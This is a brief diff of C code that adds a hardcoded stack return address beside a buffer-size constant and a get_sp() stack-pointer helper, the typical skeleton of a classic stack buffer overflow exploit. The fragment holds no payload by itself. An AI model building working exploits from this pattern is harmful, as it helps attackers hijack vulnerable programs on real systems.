@@ -9,6 +9,8 @@
 
 #define BUFFER_SIZE 408
 
+static char addr[] = "\x86\xfb\xff\xbf";
+
 unsigned long get_sp(void) {
   __asm__("movl %esp, %eax");
 }
